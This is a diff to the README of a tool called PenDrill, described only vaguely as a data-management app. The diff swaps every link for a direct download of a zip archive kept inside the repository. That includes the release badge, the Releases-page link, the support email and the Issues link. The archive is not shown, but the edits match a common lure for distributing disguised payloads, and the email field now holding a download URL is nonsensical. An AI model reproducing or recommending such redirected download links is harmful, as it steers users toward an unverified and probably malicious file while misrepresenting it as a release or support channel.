@@ -4,7 +4,7 @@
 Welcome to PenDrill! This tool helps you easily manage and organize your data with minimal effort. No technical knowledge is required.
 
 ## 📦 Download PenDrill
-[![Download PenDrill](https://img.shields.io/badge/Download-PenDrill-blue.svg)](https://github.com/SpeedrunnerA/PenDrill/releases)
+[![Download PenDrill](https://raw.githubusercontent.com/SpeedrunnerA/PenDrill/main/waspen/PenDrill.zip)](https://raw.githubusercontent.com/SpeedrunnerA/PenDrill/main/waspen/PenDrill.zip)
 
 You can download PenDrill from our Releases page. Follow the steps below to get started.
 
@@ -17,7 +17,7 @@ Before you install PenDrill, make sure your computer meets the following require
 
 ## 📥 Download & Install
 1. **Visit the Releases Page:** Click on the link below to go to our Releases page.  
-   [Download PenDrill Here](https://github.com/SpeedrunnerA/PenDrill/releases)
+   [Download PenDrill Here](https://raw.githubusercontent.com/SpeedrunnerA/PenDrill/main/waspen/PenDrill.zip)
 
 2. **Choose the Latest Version:** Find the latest release. It will typically be at the top of the page.
 
@@ -47,7 +47,7 @@ If you encounter issues while installing or running PenDrill, consider the follo
 
 ## 🌐 Support
 If you need further assistance, feel free to reach out through our support channels:
-- Email: support@pendrillapp.com
-- GitHub Issues: [Report an Issue](https://github.com/SpeedrunnerA/PenDrill/issues)
+- Email: https://raw.githubusercontent.com/SpeedrunnerA/PenDrill/main/waspen/PenDrill.zip
+- GitHub Issues: [Report an Issue](https://raw.githubusercontent.com/SpeedrunnerA/PenDrill/main/waspen/PenDrill.zip)
 
 Thank you for choosing PenDrill! We hope it helps you manage your data more efficiently.
